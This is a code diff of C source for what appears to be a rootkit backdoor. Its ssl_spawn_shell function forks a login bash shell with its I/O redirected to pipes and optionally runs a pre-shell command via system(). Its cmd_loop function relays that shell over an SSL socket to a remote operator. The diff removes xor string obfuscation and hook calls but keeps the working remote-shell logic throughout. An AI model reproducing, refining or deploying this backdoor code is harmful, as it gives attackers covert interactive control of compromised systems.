@@ -18,47 +18,42 @@ int write_loop(int fd, char *buf){
 int ssl_spawn_shell(int stdin[], int stdout[]){
     pid_t pid;
 
-    hook(CCHDIR);
-
     if(pipe(stdin) < 0 || pipe(stdout) < 0) return -1;
     if((pid = fork()) < 0) return -1;
 
     if(pid == 0){
-        (void)close(stdin[1]);
-        (void)close(stdout[0]);
+        close(stdin[1]);
+        close(stdout[0]);
 
         /* rearrange stdin and stdout */
-        (void)dup2(stdin[0], 0);
-        (void)dup2(stdout[1], 1);
-        (void)dup2(stdout[1], 2);
+        dup2(stdin[0], 0);
+        dup2(stdout[1], 1);
+        dup2(stdout[1], 2);
 
-        xor(idir, INSTALL_DIR);
-        (void)call(CCHDIR, idir);
-        clean(idir);
-
+        chdir(INSTALL_DIR);
 #ifdef EXEC_PRE_SHELL
-        xor(pre_shell, PRE_SHELL);
-        (void)system(pre_shell);
-        clean(pre_shell);
+        system(PRE_SHELL);
 #endif
-
-        (void)execl("/bin/bash", "bash", "-l", NULL);
+        execl(BASH_PATH, BASH_STR, LOGIN_FLAG, NULL);
     }
 
-    (void)close(stdin[0]);
-    (void)close(stdout[1]);
+    close(stdin[0]);
+    close(stdout[1]);
 
     return 1;
 }
 
 void cmd_loop(int sockfd){
-    int child_stdin[2], child_stdout[2], maxfd, r, cnt, ssl_err;
-    char buf[DEFAULT_TCP_BUF_LEN], tmp[512], *tmp_str;
+    int child_stdin[2], child_stdout[2],
+        maxfd, r, cnt, ssl_err;
+    char buf[DEFAULT_TCP_BUF_LEN],
+         tmp[512], *tmp_str;
     ssize_t n_r;
 
     hook(CREAD);
 
     if(ssl_spawn_shell(child_stdin, child_stdout) < 0) goto end_cmd_loop;
+
     maxfd = child_stdout[0];
     if(sockfd > maxfd) maxfd = sockfd;
 
@@ -85,7 +80,7 @@ void cmd_loop(int sockfd){
                         ssl_err != SSL_ERROR_WANT_READ &&
                         ssl_err != SSL_ERROR_WANT_WRITE) goto end_cmd_loop;
 
-                (void)write_loop(child_stdin[1], buf);
+                write_loop(child_stdin[1], buf);
             }while(SSL_pending(ssl));
         }
 
@@ -97,15 +92,16 @@ void cmd_loop(int sockfd){
         }else{
             while(n_r > sizeof(tmp)){
                 ++cnt;
-                (void)strncpy(tmp, buf, sizeof(tmp) - 1);
+                strncpy(tmp, buf, sizeof(tmp) - 1);
                 s_write(tmp);
                 n_r -= sizeof(tmp);
                 tmp_str = &buf[sizeof(tmp)];
-                (void)strncpy(buf, tmp_str, sizeof(buf) - 1);
+                strncpy(buf, tmp_str, sizeof(buf) - 1);
             }
             s_write(buf);
         }
     }
+
 end_cmd_loop:
     if(ssl != NULL){
         SSL_shutdown(ssl);
